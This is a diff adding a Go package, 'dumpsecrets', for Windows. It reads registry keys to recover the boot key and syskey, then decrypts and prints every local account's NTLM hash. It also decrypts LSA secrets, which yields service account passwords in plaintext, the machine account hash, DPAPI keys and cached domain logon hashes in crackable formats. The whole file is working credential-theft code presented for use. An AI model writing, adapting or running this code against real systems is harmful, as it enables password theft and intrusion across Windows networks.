@@ -1,0 +1,790 @@
+//go:build windows
+// +build windows
+
+package dumpsecrets
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/des"
+	"crypto/sha256"
+	"encoding/binary"
+	"encoding/hex"
+	"encoding/json"
+	"errors"
+	"fmt"
+	"log"
+	"os"
+	"strconv"
+	"strings"
+	"syscall"
+
+	"golang.org/x/crypto/md4"
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
+	"golang.org/x/sys/windows/svc/mgr"
+	"golang.org/x/text/encoding/unicode"
+)
+
+type SamSecret struct {
+	Name   string
+	Rid    string
+	NtHash string
+}
+
+type SamSecrets struct {
+	SamSecrets []SamSecret
+}
+type LsaSecrets struct {
+	LsaSecrets map[string][]string
+}
+
+type SecretPrinter interface {
+	ClassicPrint()
+}
+
+func JsonPrint(v SecretPrinter) {
+	j, err := json.MarshalIndent(v, "", " ")
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println(string(j))
+}
+
+func (l *LsaSecrets) ClassicPrint() string {
+	result := "[+] LSA SECRETS"
+	for k, v := range l.LsaSecrets {
+		result += fmt.Sprintf("[+] %s\n", k)
+		for _, cred := range v {
+			result += fmt.Sprintf("%s\n", cred)
+		}
+	}
+	return result
+}
+
+func (s *SamSecrets) ClassicPrint() string {
+	result := "[+] SAM\n"
+	for _, x := range s.SamSecrets {
+		result += fmt.Sprintf("%s:%s:%s\n", x.Name, x.Rid, x.NtHash)
+	}
+	return result
+}
+
+// only for windows 10 version 1609+
+func GetAESSysKey() ([]byte, []byte, error) {
+	// Add Error Handling
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", registry.ALL_ACCESS)
+	if err != nil {
+		//log.Println("Failed to open registry key", err)
+		return nil, nil, err
+	}
+	defer key.Close()
+	rawF, _, err := key.GetBinaryValue("F")
+	if err != nil {
+		return nil, nil, err
+	}
+	if rawF[0] != 3 {
+		return nil, nil, errors.New("RC4 Encrypted SysKey Detected. Not Supported.")
+	}
+	sysKey := rawF[0x88 : 0x88+16]
+	sysKeyIv := rawF[0x78 : 0x78+16]
+	//log.Printf("[+] SYSKEY %s", hex.EncodeToString(sysKey))
+	//log.Printf("[+] SYSKEY IV %s", hex.EncodeToString(sysKeyIv))
+	return sysKey, sysKeyIv, nil
+}
+
+func GetAesEncyptedHash(rid string) ([]byte, []byte, []byte, error) {
+	// Add Error Handling
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SAM\\SAM\\Domains\\Account\\Users\\%s", rid), registry.ALL_ACCESS)
+	if err != nil {
+		return nil, nil, nil, err
+	}
+	defer key.Close()
+	rawV := make([]byte, 0)
+	rawV, _, err = key.GetBinaryValue("V")
+	if err != nil {
+		return nil, nil, nil, err
+	}
+	if err != nil {
+		return nil, nil, nil, err
+	}
+	o := binary.LittleEndian.Uint32(rawV[12:16]) + 204
+	l := binary.LittleEndian.Uint32(rawV[16:20])
+	userName := rawV[o : o+l]
+	hashLength := rawV[0xAC]
+	if hashLength == 0x14 {
+		return nil, nil, nil, errors.New("[!] Rc4 Encrypted Hash Detected. Not Supported.")
+	}
+	if hashLength != 0x38 {
+		return nil, nil, nil, errors.New("User has no NTLM Hash")
+	}
+	//log.Printf("[+] HASH LENGTH %d", hashLength)
+	hashOffset := binary.LittleEndian.Uint16(rawV[0xa8 : 0xa8+4]) //+ 0xCC
+	ntOffSetInt := hashOffset + uint16(0xCC)
+	ntRevision := rawV[ntOffSetInt+2 : ntOffSetInt+3][0]
+	if ntRevision != 2 {
+		return nil, nil, nil, errors.New("[!] Not AES Hash. Not Supported.")
+	}
+	exists := rawV[0x9C+16 : 0x9C+20][0]
+	if exists != 56 {
+		return nil, nil, nil, errors.New("[!] No Hash Found.")
+	}
+	iv := rawV[ntOffSetInt+8 : ntOffSetInt+24]
+	hash := rawV[ntOffSetInt+24 : ntOffSetInt+24+56][:16]
+	//log.Printf("[+] Double Encrypted NTLM HASH %s\n", hex.EncodeToString(hash))
+	//log.Printf("[+] Double Encrypted NTLM HASH IV %s\n", hex.EncodeToString(iv))
+	return hash, iv, userName, nil
+}
+
+type KeyInfo struct {
+	Class           *uint16
+	Classlen        uint32
+	SaLen           uint32
+	MaxClassLen     uint32
+	SubKeyCount     uint32
+	MaxSubKeyLen    uint32 // size of the key's subkey with the longest name, in Unicode characters, not including the terminating zero byte
+	ValueCount      uint32
+	MaxValueNameLen uint32 // size of the key's longest value name, in Unicode characters, not including the terminating zero byte
+	MaxValueLen     uint32 // longest data component among the key's values, in bytes
+	lastWriteTime   syscall.Filetime
+}
+
+func GetBootKey() ([]byte, error) {
+	tmpKey := ""
+	bootKey := make([]byte, 0)
+	keysToGet := []string{"JD", "Skew1", "GBG", "Data"}
+	for _, key := range keysToGet {
+		key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s", key), registry.ALL_ACCESS)
+		if err != nil {
+			return nil, err
+		}
+		defer key.Close()
+		classDataSize := uint32(20)
+		classData := make([]uint16, classDataSize)
+		ki := KeyInfo{Class: &classData[0], Classlen: classDataSize}
+		err = syscall.RegQueryInfoKey(syscall.Handle(key), ki.Class, &ki.Classlen, nil, &ki.SubKeyCount, &ki.MaxSubKeyLen, &ki.MaxClassLen, &ki.ValueCount, &ki.MaxValueNameLen, &ki.MaxValueLen, &ki.SaLen, &ki.lastWriteTime)
+		if err != nil {
+			return nil, err
+		}
+		tmpkeyChunk := []byte(syscall.UTF16ToString(classData))
+		tmpKey += string(tmpkeyChunk)
+	}
+	if len(tmpKey) > 32 {
+		// https://github.com/C-Sto/gosecretsdump/blob/master/pkg/systemreader/systemreader.go
+		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
+		tmpKey, _ = ud.String(tmpKey)
+	}
+	transforms := []int{8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7}
+	unhexedKey, err := hex.DecodeString(tmpKey)
+	if err != nil {
+		return nil, err
+	}
+	for i := 0; i < len(unhexedKey); i++ {
+		bootKey = append(bootKey, unhexedKey[transforms[i]])
+	}
+	//log.Printf("[+] BOOT KEY %s", hex.EncodeToString(bootKey))
+	return bootKey, nil
+}
+
+func DecryptAES(key, value, iv []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	thing := cipher.NewCBCDecrypter(block, iv)
+	dst := make([]byte, len(value))
+	thing.CryptBlocks(dst, value)
+	return dst, nil
+}
+
+func DecryptDES(key, value []byte) []byte {
+	c, err := des.NewCipher(key)
+	if err != nil {
+		log.Fatal(err)
+	}
+	decrypted := make([]byte, 8)
+	c.Decrypt(decrypted, value)
+	return decrypted
+}
+
+func DecryptSysKey(bootKey, sysKey, sysKeyIV []byte) ([]byte, error) {
+	decrypytedSysKey, err := DecryptAES(bootKey, sysKey, sysKeyIV)
+	if err != nil {
+		return nil, err
+	}
+	//log.Printf("[+] DECRYPTED SYSKEY %s\n", hex.EncodeToString(decrypytedSysKey))
+	return decrypytedSysKey, err
+}
+
+func DecryptedNtlmHashPartOne(sysKey, encryptedHash, encryptedHashIv []byte) ([]byte, []byte) {
+	decryptedHash, err := DecryptAES(sysKey, encryptedHash, encryptedHashIv)
+	if err != nil {
+		return nil, nil
+	}
+	//log.Printf("[+] DECRYPTED NTLM PART 1 %s\n", hex.EncodeToString(decryptedHash[:8]))
+	//log.Printf("[+] DECRYPTED NTLM PART 2 %s\n", hex.EncodeToString(decryptedHash[8:16]))
+	return decryptedHash[:8], decryptedHash[8:16]
+}
+
+func DecryptedNtlmHashPartTwo(encryptedNTLMHash1, encryptedNTLMHash2 []byte, rid string) (string, error) {
+	// converting RID to int then little endian.
+	r := make([]byte, 4)
+	p, err := strconv.ParseUint(rid, 16, 32)
+	if err != nil {
+		return "", err
+	}
+	// needs to be little endian
+	binary.LittleEndian.PutUint32(r, uint32(p))
+	// get des keys
+	desKey1 := make([]byte, 0)
+	desKey2 := make([]byte, 0)
+	desKey1 = append(desKey1, r[0])
+	desKey1 = append(desKey1, r[1])
+	desKey1 = append(desKey1, r[2])
+	desKey1 = append(desKey1, r[3])
+	desKey1 = append(desKey1, r[0])
+	desKey1 = append(desKey1, r[1])
+	desKey1 = append(desKey1, r[2])
+	desKey2 = append(desKey2, r[3])
+	desKey2 = append(desKey2, r[0])
+	desKey2 = append(desKey2, r[1])
+	desKey2 = append(desKey2, r[2])
+	desKey2 = append(desKey2, r[3])
+	desKey2 = append(desKey2, r[0])
+	desKey2 = append(desKey2, r[1])
+	// convert above des keys from 7 bytes to 8 bytes.
+	des1 := strToKey(desKey1)
+	des2 := strToKey(desKey2)
+
+	deskey1, err := hex.DecodeString(hex.EncodeToString(des1[:]))
+	deskey2, err := hex.DecodeString(hex.EncodeToString(des2[:]))
+	ntlm1, err := hex.DecodeString(hex.EncodeToString(encryptedNTLMHash1))
+	ntlm2, err := hex.DecodeString(hex.EncodeToString(encryptedNTLMHash2))
+	hash := fmt.Sprintf("%s%s", hex.EncodeToString(DecryptDES(deskey1, ntlm1)), hex.EncodeToString(DecryptDES(deskey2, ntlm2)))
+	//log.Printf("[+] Final Hash %s\n", hash)
+	return hash, nil
+}
+
+func strToKey(s []byte) [8]byte {
+	key := make([]byte, 0)
+	key = append(key, s[0]>>1)
+	key = append(key, ((s[0]&0x01)<<6)|s[1]>>2)
+	key = append(key, ((s[1]&0x03)<<5)|s[2]>>3)
+	key = append(key, ((s[2]&0x07)<<4)|s[3]>>4)
+	key = append(key, ((s[3]&0x0F)<<3)|s[4]>>5)
+	key = append(key, ((s[4]&0x01F)<<2)|s[5]>>6)
+	key = append(key, ((s[5]&0x3F)<<1)|s[6]>>7)
+	key = append(key, s[6]&0x7F)
+	for x := 0; x < 8; x++ {
+		key[x] = (key[x] << 1)
+		key[x] = byte(oddParity[int(key[x])])
+	}
+	var data [8]byte
+	for x := range key {
+		data[x] = key[x]
+	}
+	return data
+}
+
+var oddParity = []int{
+	1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
+	16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
+	32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
+	49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
+	64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
+	81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
+	97, 97, 98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110,
+	112, 112, 115, 115, 117, 117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127,
+	128, 128, 131, 131, 133, 133, 134, 134, 137, 137, 138, 138, 140, 140, 143, 143,
+	145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155, 155, 157, 157, 158, 158,
+	161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173, 174, 174,
+	176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191,
+	193, 193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206,
+	208, 208, 211, 211, 213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223,
+	224, 224, 227, 227, 229, 229, 230, 230, 233, 233, 234, 234, 236, 236, 239, 239,
+	241, 241, 242, 242, 244, 244, 247, 247, 248, 248, 251, 251, 253, 253, 254, 254,
+}
+
+func GetRids() ([]string, error) {
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, fmt.Sprintf("SAM\\SAM\\Domains\\Account\\Users"), registry.ALL_ACCESS)
+	if err != nil {
+		return nil, err
+	}
+	rids, err := key.ReadSubKeyNames(0)
+	if err != nil {
+		return nil, err
+	}
+	return rids, nil
+}
+
+func DumpHash(rid string, sysKey []byte) (*SamSecret, error) {
+	encryptedHash, encryptedHashIv, userName, err := GetAesEncyptedHash(rid)
+	if err != nil {
+		return nil, err
+	}
+	firstHalf, secondHalf := DecryptedNtlmHashPartOne(sysKey, encryptedHash, encryptedHashIv)
+	if firstHalf == nil || secondHalf == nil {
+		return nil, errors.New("Failed To Decrypt NTLM HASHES")
+	}
+	hash, err := DecryptedNtlmHashPartTwo(firstHalf, secondHalf, rid)
+	if err != nil {
+		return nil, err
+	}
+	ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
+	name, err := ud.String(string(userName))
+	if err != nil {
+		return nil, err
+	}
+	p, err := strconv.ParseUint(rid, 16, 32)
+	if err != nil {
+		return nil, err
+	}
+	ridStr := strconv.Itoa(int(p))
+	return &SamSecret{
+		Name:   name,
+		Rid:    ridStr,
+		NtHash: hash,
+	}, nil
+}
+
+func GetSysKey() ([]byte, error) {
+	encryptedSysKey, encryptedSysKeyIv, err := GetAESSysKey()
+	if err != nil {
+		return nil, err
+	}
+	bootKey, err := GetBootKey()
+	if err != nil {
+		return nil, err
+	}
+	sysKey, err := DecryptSysKey(bootKey, encryptedSysKey, encryptedSysKeyIv)
+	if err != nil {
+		return nil, err
+	}
+	return sysKey, nil
+}
+
+func DecryptAESLSA(secret, bootkey []byte) []byte {
+	//https://github.com/0xbadjuju/TellMeYourSecrets/blob/baf56d085cd93f93d3ea85a2c2280065cb880190/LSASecrets.cs#L108
+	tmpKey := make([]byte, 0)
+	tmpDecrypted := make([]byte, 16)
+	decrypted := make([]byte, 0)
+	iv := make([]byte, 16)
+	for y := 0; y < 16; y++ {
+		iv[y] = 0x00
+	}
+	tmpKey = append(tmpKey, bootkey...)
+	for x := 1; x < 1000+1; x++ {
+		tmpKey = append(tmpKey, secret[28:60]...)
+	}
+	aesKey := sha256.Sum256(tmpKey)
+	for x := 60; x < len(secret); x += 16 {
+		c, err := aes.NewCipher(aesKey[:])
+		if err != nil {
+			log.Fatal(err)
+		}
+		thing := cipher.NewCBCDecrypter(c, iv)
+		tmpbuf := secret[x : x+16]
+		if len(tmpbuf) < 16 {
+			diff := (16 - len(tmpbuf))
+			var padding []byte
+			for n := 0; n < diff; n++ {
+				padding = append(padding, 0x00)
+			}
+			tmpbuf = append(tmpbuf, padding...)
+		}
+		// decrypt and append
+		thing.CryptBlocks(tmpDecrypted, tmpbuf)
+		decrypted = append(decrypted, tmpDecrypted...)
+	}
+	return decrypted[68:100]
+}
+
+func GetLSAKey(bootKey []byte) []byte {
+	key, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", registry.ALL_ACCESS)
+	if err != nil {
+		return nil
+	}
+	data := make([]byte, 0)
+	n, _, err := key.GetValue("", data)
+	if err != nil {
+		return nil
+	}
+	data = make([]byte, n)
+	n, _, err = key.GetValue("", data)
+	if err != nil {
+		return nil
+	}
+	lsaKey := DecryptAESLSA(data, bootKey)
+	return lsaKey
+}
+
+type LSASecretBlob struct {
+	Length uint16
+	Unk    []byte
+	Secret []byte
+}
+
+type LSASecret struct {
+	Version  []byte
+	EncKeyID []byte
+	EncAlgo  []byte
+	Flags    []byte
+	Data     []byte
+}
+
+func DecryptAESECB(secret, key []byte) []byte {
+	decrypted := make([]byte, len(secret))
+	size := 16
+	cipher, _ := aes.NewCipher(key)
+	for bs, be := 0, size; bs < len(secret); bs, be = bs+size, be+size {
+		cipher.Decrypt(decrypted[bs:be], secret[bs:be])
+	}
+	return decrypted
+
+}
+
+func ExtractLsaSecret(keyName string, blob *LSASecretBlob) (string, error) {
+	if strings.HasPrefix(keyName, "_SC_") {
+		var serviceName string
+		var s *uint16
+		h, err := windows.OpenSCManager(s, nil, windows.SC_MANAGER_ENUMERATE_SERVICE)
+		if err != nil {
+			return "", errors.New("Failed to open service manager")
+		}
+		svcMgr := &mgr.Mgr{}
+		svcMgr.Handle = h
+		name := syscall.StringToUTF16Ptr(keyName[4:])
+		h, err = windows.OpenService(svcMgr.Handle, name, windows.SERVICE_QUERY_CONFIG|windows.SC_MANAGER_ENUMERATE_SERVICE)
+		serv := &mgr.Service{}
+		serv.Handle = h
+		serv.Name = keyName[4:]
+		serviceConfig, err := serv.Config()
+		if err != nil {
+			serv.Close()
+			return "", errors.New("Failed to get service name")
+
+		}
+		serviceName = serviceConfig.ServiceStartName
+		serv.Close()
+		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
+		plainText, _ := ud.String(string(blob.Secret))
+		return fmt.Sprintf("%s:%s", serviceName, plainText), nil
+
+	}
+	if strings.HasPrefix(strings.ToUpper(keyName), "$MACHINE.ACC") {
+		host, err := os.Hostname()
+		var domain string
+		if err != nil {
+			host = "."
+		}
+		k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`, registry.ALL_ACCESS)
+		if err != nil {
+			domain = "??"
+		}
+		domain, _, err = k.GetStringValue("Domain")
+		if err != nil {
+			domain = ""
+		}
+		h := md4.New()
+		h.Write(blob.Secret)
+		return fmt.Sprintf("%s\\%s$:aad3b435b51404eeaad3b435b51404ee:%s", domain, host, hex.EncodeToString(h.Sum(nil))), nil
+	}
+	if strings.HasPrefix(strings.ToUpper(keyName), "DPAPI") {
+		h1 := fmt.Sprintf("dpapiMachine key: %s\n", hex.EncodeToString(blob.Secret[4:24]))
+		h2 := fmt.Sprintf("dpapiUser key: %s", hex.EncodeToString(blob.Secret[24:44]))
+		return fmt.Sprintf("%s%s", h1, h2), nil
+	}
+	if strings.HasPrefix(strings.ToUpper(keyName), "NL$KM") {
+		return fmt.Sprintf("NL$KM:%s", hex.EncodeToString(blob.Secret)), nil
+	}
+	if strings.HasPrefix(strings.ToUpper(keyName), "ASPNET_WP_PASSWORD") {
+		return fmt.Sprintln("ASP.net"), nil
+	}
+	return fmt.Sprintf("Secret uknown or not supported %s", hex.EncodeToString(blob.Secret)), nil
+}
+
+func DumpSecret(registryKey string, lsaKey []byte) []byte {
+	secKey, err := registry.OpenKey(registry.LOCAL_MACHINE, registryKey, registry.ALL_ACCESS)
+	if err != nil {
+		secKey.Close()
+		return nil
+	}
+	defer secKey.Close()
+	data := make([]byte, 0)
+	n, _, err := secKey.GetValue("", data)
+	if err != nil {
+		secKey.Close()
+		return nil
+	}
+	data = make([]byte, n)
+	n, _, err = secKey.GetValue("", data)
+	if err != nil {
+		secKey.Close()
+		return nil
+	}
+	secret := &LSASecret{
+		Version:  data[:4],
+		EncKeyID: data[4:20],
+		EncAlgo:  data[20:24],
+		Flags:    data[24:28],
+		Data:     data[28:],
+	}
+	tmpKey := ComputeSha256(lsaKey, secret.Data[:32])
+	val2 := secret.Data[32:]
+	plainText := DecryptAESECB(val2, tmpKey)
+	return plainText
+}
+
+func GetNLKMSecret(lsaKey []byte) (string, []byte) {
+	key := "SECURITY\\Policy\\Secrets\\NL$KM\\CurrVal"
+	plainText := DumpSecret(key, lsaKey)
+	if plainText == nil {
+		return "", nil
+	}
+	secretLen := binary.LittleEndian.Uint16(plainText[:4])
+	secretBlob := &LSASecretBlob{
+		Length: secretLen,
+		Unk:    plainText[4:16],
+		Secret: plainText[16 : secretLen+16],
+	}
+	secret, err := ExtractLsaSecret("NL$KM", secretBlob)
+	if err != nil {
+		return "", nil
+	}
+	return secret, plainText
+}
+
+type NLRecord struct {
+	UserLength       int
+	DomainNameLength int
+	DnsDomainLength  int
+	IV               []byte
+	EncryptedData    []byte
+}
+
+type CachedCredentials struct {
+	UserName   string
+	Domain     string
+	Credential string
+}
+
+type CachedDomainCredentials struct {
+	Credentials []*CachedCredentials
+}
+
+func Pad(data int) int {
+	if data&0x3 == 0 {
+		return data + (data & 0x03)
+	}
+	return data
+}
+
+func GeneratePadding(amount int) []byte {
+	padding := make([]byte, amount)
+	for x := 0; x < amount; x++ {
+		padding = append(padding, 0x00)
+	}
+	return padding
+}
+
+func GetCachedDomainCredentials(nlkmKey []byte) (*CachedDomainCredentials, error) {
+	Credentials := &CachedDomainCredentials{
+		Credentials: make([]*CachedCredentials, 0),
+	}
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Cache", registry.ALL_ACCESS)
+	if err != nil {
+		return nil, err
+	}
+	values, err := k.ReadValueNames(0)
+	if err != nil {
+		return nil, err
+	}
+	for _, v := range values {
+		if v == "NL$CONTROL" {
+			continue
+		}
+		data, _, err := k.GetBinaryValue(v)
+		if err != nil {
+			continue
+		}
+		if data == nil {
+			continue
+		}
+		if len(data) < 96 {
+			continue
+		}
+		cachedUser := NLRecord{
+			UserLength:       int(binary.LittleEndian.Uint16(data[:2])),
+			DomainNameLength: int(binary.LittleEndian.Uint16(data[2:4])),
+			DnsDomainLength:  int(binary.LittleEndian.Uint16(data[60:62])),
+			IV:               data[64:80],
+			EncryptedData:    data[96:],
+		}
+		if cachedUser.UserLength == 0 {
+			continue
+		}
+		block, err := aes.NewCipher(nlkmKey[16:32])
+		if err != nil {
+			log.Fatal(err)
+			continue
+		}
+		thing := cipher.NewCBCDecrypter(block, cachedUser.IV)
+		leftOver := len(cachedUser.EncryptedData) % 16
+		if leftOver != 0 {
+			padding := make([]byte, 0)
+			for i := 16 - leftOver; i > 0; i-- {
+				padding = append(padding, 0x00)
+			}
+			concat := make([]byte, len(cachedUser.EncryptedData)+len(padding))
+			concat = append(concat, cachedUser.EncryptedData...)
+			concat = append(concat, padding...)
+			cachedUser.EncryptedData = concat
+		}
+		plainText := make([]byte, len(cachedUser.EncryptedData))
+		thing.CryptBlocks(plainText, cachedUser.EncryptedData)
+		ud := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
+		unameOffset := 72
+		pad := 2 * ((cachedUser.UserLength / 2) % 2)
+		domainOffset := unameOffset + cachedUser.UserLength + pad
+		pad = 2 * ((cachedUser.DomainNameLength / 2) % 2)
+		domainNameOffset := domainOffset + cachedUser.DomainNameLength + pad
+		hashedPw := plainText[:0x10]
+		userName, err := ud.String(string(plainText[unameOffset : unameOffset+cachedUser.UserLength]))
+		domain, err := ud.String(string(plainText[domainOffset : domainOffset+cachedUser.DomainNameLength]))
+		domain = strings.ReplaceAll(domain, `\0`, "")
+		domainName, err := ud.String(string(plainText[domainNameOffset : domainNameOffset+cachedUser.DnsDomainLength]))
+		if err != nil {
+			return nil, err
+		}
+		cred := fmt.Sprintf("%s/%s:$DCC2$10240#%s#%s", domain, userName, userName, hex.EncodeToString(hashedPw))
+		c := &CachedCredentials{
+			UserName:   userName,
+			Domain:     domain + domainName,
+			Credential: cred,
+		}
+		Credentials.Credentials = append(Credentials.Credentials, c)
+	}
+	return Credentials, nil
+}
+
+func GetLSASecrets(lsaKey []byte) (*LsaSecrets, error) {
+	secretsMap := &LsaSecrets{}
+	secretsMap.LsaSecrets = make(map[string][]string, 0)
+	NLKMSecretString, NLKMSecretBlob := GetNLKMSecret(lsaKey)
+	if NLKMSecretString != "" {
+		secretsMap.LsaSecrets["NL$KM"] = append(secretsMap.LsaSecrets["NL$KM"], NLKMSecretString)
+		cached, err := GetCachedDomainCredentials(NLKMSecretBlob)
+		if err != nil {
+			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], "NULL")
+		}
+		for _, c := range cached.Credentials {
+			secretsMap.LsaSecrets["CachedDomainLogons"] = append(secretsMap.LsaSecrets["CachedDomainLogons"], c.Credential)
+		}
+	}
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", registry.ALL_ACCESS)
+	if err != nil {
+		return nil, err
+	}
+	defer k.Close()
+	subkeys, err := k.ReadSubKeyNames(0)
+	if err != nil {
+		return nil, err
+	}
+	for _, key := range subkeys {
+		if key == "NL$KM" {
+			continue
+		}
+		plainText := DumpSecret(fmt.Sprintf("SECURITY\\Policy\\Secrets\\%s\\CurrVal", key), lsaKey)
+		if plainText == nil {
+			continue
+		}
+		secretLen := binary.LittleEndian.Uint16(plainText[:4])
+		if secretLen < 16 {
+			secretBlob := &LSASecretBlob{
+				Length: secretLen,
+				Unk:    nil,
+				Secret: plainText,
+			}
+			plainTxt, err := ExtractLsaSecret(key, secretBlob)
+			if err != nil {
+				continue
+			}
+			secretsMap.LsaSecrets[key] = append(secretsMap.LsaSecrets[key], plainTxt)
+		} else {
+			secretBlob := &LSASecretBlob{
+				Length: secretLen,
+				Unk:    plainText[4:16],
+				Secret: plainText[16 : secretLen+16],
+			}
+			plainTxt, err := ExtractLsaSecret(key, secretBlob)
+			if err != nil {
+				continue
+			}
+			secretsMap.LsaSecrets[key] = append(secretsMap.LsaSecrets[key], plainTxt)
+		}
+	}
+	return secretsMap, nil
+}
+
+func ComputeSha256(key, value []byte) []byte {
+	buffer := make([]byte, 0)
+	buffer = append(buffer, key...)
+	counter := 0
+	for i := 0; i < 1000; i++ {
+		buffer = append(buffer, value[counter:counter+32]...)
+	}
+	hash := sha256.Sum256(buffer)
+	return hash[:]
+}
+
+func GetLsa() (*LsaSecrets, error) {
+	bootKey, err := GetBootKey()
+	if err != nil {
+		return nil, err
+	}
+	lsaKey := GetLSAKey(bootKey)
+	if lsaKey == nil {
+		return nil, errors.New("Access Denied")
+	}
+	return GetLSASecrets(lsaKey)
+}
+
+func GetSam() (*SamSecrets, error) {
+	s := &SamSecrets{
+		SamSecrets: make([]SamSecret, 0),
+	}
+	sysKey, err := GetSysKey()
+	if err != nil {
+		return nil, err
+	}
+	rids, err := GetRids()
+	if err != nil {
+		return nil, err
+	}
+	for _, rid := range rids {
+		if rid != "Names" {
+			e, err := DumpHash(rid, sysKey)
+			if err != nil {
+				continue
+			}
+			s.SamSecrets = append(s.SamSecrets, *e)
+		}
+	}
+	return s, nil
+}
+
+func DumpLsaSecrets() (string, error) {
+	lsaSecrets, err := GetLsa()
+	if err != nil {
+		return "", err
+	}
+	return lsaSecrets.ClassicPrint(), nil
+}
+
+func DumpHashes() (string, error) {
+	samSecrets, err := GetSam()
+	if err != nil {
+		return "", err
+	}
+	return samSecrets.ClassicPrint(), nil
+}
